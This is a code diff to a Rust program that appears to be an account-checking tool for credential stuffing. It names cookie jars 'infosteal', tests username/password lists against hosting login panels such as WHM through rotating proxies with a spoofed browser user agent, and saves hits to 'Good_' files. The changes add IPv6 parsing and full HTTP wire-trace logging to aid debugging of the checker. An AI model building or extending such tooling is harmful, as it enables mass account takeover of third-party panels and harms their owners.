@@ -277,11 +277,16 @@ pub fn parse_url_parts(url: &str) -> Option<(String, String, String)> {
     let host = authority
         .split('@')
         .last()
-        .unwrap_or(authority)
-        .split(':')
-        .next()
-        .unwrap_or("")
-        .to_ascii_lowercase();
+        .unwrap_or(authority);
+    // An IPv6 literal is bracketed: [::1]:8080
+    let host = if let Some(stripped) = host.strip_prefix('[') {
+        match stripped.find(']') {
+            Some(i) => stripped[..i].to_ascii_lowercase(),
+            None => stripped.to_ascii_lowercase(),
+        }
+    } else {
+        host.split(':').next().unwrap_or("").to_ascii_lowercase()
+    };
     if host.is_empty() {
         return None;
     }
@@ -412,6 +417,87 @@ pub fn extract_hidden_inputs(html: &str) -> Vec<(String, String)> {
 }
 
 // ============================================================================
+// HTTP request/response log
+// ============================================================================
+
+/// Captures the raw HTTP conversation for every request.
+///
+/// Each entry is curl's own wire trace (`--trace-ascii`), so it contains the
+/// exact request line, every request header, the request body, the response
+/// status line, every response header and the response body — including the
+/// `CONNECT` exchange with a proxy.
+pub struct HttpLogger {
+    pub dir: PathBuf,
+    /// Maximum number of entries; `0` means unlimited.
+    pub limit: usize,
+    seq: AtomicUsize,
+    written: AtomicUsize,
+    index: Mutex<std::fs::File>,
+}
+
+impl HttpLogger {
+    pub fn new(dir: PathBuf, limit: usize) -> std::io::Result<Arc<Self>> {
+        let _ = fs::create_dir_all(&dir);
+        let index = OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(dir.join("index.log"))?;
+        Ok(Arc::new(HttpLogger {
+            dir,
+            limit,
+            seq: AtomicUsize::new(0),
+            written: AtomicUsize::new(0),
+            index: Mutex::new(index),
+        }))
+    }
+
+    /// Reserve the next log file, or `None` when the budget is exhausted.
+    fn next_path(&self, url: &str) -> Option<(usize, PathBuf)> {
+        let seq = self.seq.fetch_add(1, Ordering::SeqCst);
+        if self.limit != 0 && seq >= self.limit {
+            return None;
+        }
+        let label: String = url
+            .trim_start_matches("https://")
+            .trim_start_matches("http://")
+            .chars()
+            .map(|c| if c.is_ascii_alphanumeric() || c == '.' || c == '-' { c } else { '_' })
+            .take(48)
+            .collect();
+        self.written.fetch_add(1, Ordering::SeqCst);
+        Some((seq, self.dir.join(format!("{:06}-{}.txt", seq, label))))
+    }
+
+    /// Number of requests actually captured.
+    pub fn written_count(&self) -> usize {
+        self.written.load(Ordering::SeqCst)
+    }
+
+    /// Append one line to the index that ties a log file to its outcome.
+    fn write_index(
+        &self,
+        seq: usize,
+        method: &str,
+        url: &str,
+        proxy: Option<&str>,
+        status: u16,
+        outcome: &str,
+    ) {
+        let mut f = self.index.lock().unwrap();
+        let _ = writeln!(
+            f,
+            "{:06}\t{}\t{}\t{}\t{}\t{}",
+            seq,
+            method,
+            url,
+            proxy.unwrap_or("-"),
+            status,
+            outcome
+        );
+    }
+}
+
+// ============================================================================
 // HTTP client (curl backend)
 // ============================================================================
 
@@ -426,6 +512,7 @@ pub struct HttpClient {
     cookie_jar_path: PathBuf,
     proxy: Option<(ProxyType, String)>,
     user_agent: String,
+    logger: Option<Arc<HttpLogger>>,
 }
 
 static CLIENT_COUNTER: AtomicU64 = AtomicU64::new(1);
@@ -450,15 +537,19 @@ fn curl_binary() -> String {
 }
 
 impl HttpClient {
-    pub fn new(proxy: Option<(ProxyType, String)>) -> Self {
+    pub fn new(proxy: Option<(ProxyType, String)>, logger: Option<Arc<HttpLogger>>) -> Self {
         let id = CLIENT_COUNTER.fetch_add(1, Ordering::Relaxed);
         let pid = std::process::id();
         let cookie_jar_path =
             env::temp_dir().join(format!("infosteal_cookies_{}_{}.txt", pid, id));
+        // Create the jar up front so curl does not log a warning on the
+        // first request of every client.
+        let _ = fs::write(&cookie_jar_path, b"");
         HttpClient {
             cookie_jar_path,
             proxy,
             user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.0 Safari/537.36".to_string(),
+            logger,
         }
     }
 
@@ -502,6 +593,13 @@ impl HttpClient {
     ) -> Result<HttpResponse, String> {
         let marker = "__ISV_CURL_META__:";
         let mut cmd = Command::new(curl_binary());
+
+        // Reserve a log slot and ask curl for a full wire trace.
+        let trace = self
+            .logger
+            .as_ref()
+            .and_then(|l| l.next_path(url));
+
         cmd.arg("-sS")
             .arg("-k")
             .arg("-L")
@@ -520,6 +618,10 @@ impl HttpClient {
             .arg(&self.cookie_jar_path)
             .arg("-X")
             .arg(method);
+
+        if let Some((_, path)) = &trace {
+            cmd.arg("--trace-ascii").arg(path);
+        }
 
         if let Some((ptype, ref paddr)) = self.proxy {
             match normalize_proxy(paddr) {
@@ -557,7 +659,9 @@ impl HttpClient {
         let output = cmd.output().map_err(|e| format!("curl launch error: {}", e))?;
         if !output.status.success() {
             let stderr = String::from_utf8_lossy(&output.stderr);
-            return Err(format!("Network error: {}", stderr.trim()));
+            let msg = format!("Network error: {}", stderr.trim());
+            self.log_outcome(&trace, method, url, 0, &msg);
+            return Err(msg);
         }
 
         let stdout = String::from_utf8_lossy(&output.stdout);
@@ -570,6 +674,8 @@ impl HttpClient {
         let status: u16 = meta_parts.next().unwrap_or("0").parse().unwrap_or(0);
         let effective_url = meta_parts.next().unwrap_or(url).to_string();
 
+        self.log_outcome(&trace, method, url, status, "response");
+
         let cookies = self.read_cookies();
         Ok(HttpResponse {
             status,
@@ -577,6 +683,21 @@ impl HttpClient {
             body: resp_body,
             cookies,
         })
+    }
+
+    /// Record the outcome of a request in the log index.
+    fn log_outcome(
+        &self,
+        trace: &Option<(usize, PathBuf)>,
+        method: &str,
+        url: &str,
+        status: u16,
+        outcome: &str,
+    ) {
+        if let (Some(logger), Some((seq, _))) = (&self.logger, trace) {
+            let proxy = self.proxy.as_ref().map(|(_, p)| p.clone());
+            logger.write_index(*seq, method, url, proxy.as_deref(), status, outcome);
+        }
     }
 
     fn read_cookies(&self) -> HashMap<String, String> {
@@ -611,6 +732,7 @@ impl Drop for HttpClient {
 pub fn check_account(
     target: &TargetAccount,
     proxy: Option<(ProxyType, String)>,
+    logger: Option<Arc<HttpLogger>>,
 ) -> Result<CheckStatus, String> {
     if target.username.len() > 32
         || target.password.len() > 32
@@ -619,7 +741,7 @@ pub fn check_account(
         return Ok(CheckStatus::Invalid);
     }
 
-    let client = HttpClient::new(proxy);
+    let client = HttpClient::new(proxy, logger);
     let init_headers = [
         (
             "Accept",
@@ -1527,6 +1649,10 @@ pub struct EngineState {
     pub speed_history: Mutex<Vec<u64>>,
     pub results_dir: Mutex<PathBuf>,
     pub file_lock: Mutex<()>,
+    /// Capture the raw HTTP conversation of every request.
+    pub http_logging: AtomicBool,
+    pub http_log_limit: AtomicUsize,
+    pub http_logger: Mutex<Option<Arc<HttpLogger>>>,
 }
 
 impl EngineState {
@@ -1553,6 +1679,9 @@ impl EngineState {
             speed_history: Mutex::new(vec![0; 30]),
             results_dir: Mutex::new(results_root),
             file_lock: Mutex::new(()),
+            http_logging: AtomicBool::new(false),
+            http_log_limit: AtomicUsize::new(200),
+            http_logger: Mutex::new(None),
         })
     }
 
@@ -1685,7 +1814,7 @@ pub fn start_workers(state: Arc<EngineState>) {
 
     let purl = state.proxy_url.lock().unwrap().trim().to_string();
     if !purl.is_empty() {
-        if let Ok(resp) = HttpClient::new(None).get(&purl, &[]) {
+        if let Ok(resp) = HttpClient::new(None, None).get(&purl, &[]) {
             state.load_proxies_from_str(&resp.body);
         }
     }
@@ -1710,7 +1839,20 @@ pub fn start_workers(state: Arc<EngineState>) {
             run_dir.display()
         );
     }
-    *state.results_dir.lock().unwrap() = run_dir;
+    *state.results_dir.lock().unwrap() = run_dir.clone();
+
+    // The HTTP log lives inside the run directory, so the Results button
+    // opens both.
+    if state.http_logging.load(Ordering::SeqCst) {
+        let limit = state.http_log_limit.load(Ordering::SeqCst);
+        match HttpLogger::new(run_dir.join("http"), limit) {
+            Ok(l) => {
+                eprintln!("HTTP log: {}", l.dir.display());
+                *state.http_logger.lock().unwrap() = Some(l);
+            }
+            Err(e) => eprintln!("warning: cannot open the HTTP log: {}", e),
+        }
+    }
 
     let n_threads = state
         .threads_count
@@ -1779,7 +1921,8 @@ pub fn start_workers(state: Arc<EngineState>) {
                     }
                 };
 
-                match check_account(&target, proxy_cfg) {
+                let logger = st.http_logger.lock().unwrap().clone();
+                match check_account(&target, proxy_cfg, logger) {
                     Ok(CheckStatus::Good(panel, extra)) => {
                         st.append_result(
                             &format!("Good_{}.txt", panel),
@@ -2029,7 +2172,7 @@ fn run_self_test() {
         }
     });
 
-    let client = HttpClient::new(None);
+    let client = HttpClient::new(None, None);
     let url = format!("http://127.0.0.1:{}/", port);
     let origin = format!("http://127.0.0.1:{}", port);
     let dummy = TargetAccount {
@@ -2108,7 +2251,7 @@ fn run_self_test() {
         implicit_scheme: true,
         attempts: 0,
     };
-    let result = check_account(&fallback, None).unwrap();
+    let result = check_account(&fallback, None, None).unwrap();
     assert_eq!(result, CheckStatus::Good("WHM".to_string(), String::new()));
 
     println!("SELF-TEST PASSED: parsers, JSFuck solver, HTML helpers and live panel check verified.");
@@ -2130,6 +2273,8 @@ fn main() {
     let mut parse_only = false;
     let mut preload: Option<String> = None;
     let mut autostart = false;
+    let mut log_http = false;
+    let mut log_limit = 200usize;
     let mut unknown: Vec<String> = Vec::new();
 
     let mut i = 1;
@@ -2169,6 +2314,15 @@ fn main() {
             "--autostart" => {
                 autostart = true;
             }
+            "--log-http" => {
+                log_http = true;
+            }
+            "--log-limit" if i + 1 < args.len() => {
+                if let Ok(n) = args[i + 1].parse::<usize>() {
+                    log_limit = n;
+                }
+                i += 1;
+            }
             "--help" | "-h" => {
                 print_help();
                 return;
@@ -2194,6 +2348,9 @@ fn main() {
     if let Some(u) = proxy_url {
         *state.proxy_url.lock().unwrap() = u;
     }
+    state.http_logging.store(log_http, Ordering::SeqCst);
+    state.http_log_limit.store(log_limit, Ordering::SeqCst);
+
     if let Some(af) = accounts_file {
         let n = state
             .load_accounts_from_path(Path::new(&af))
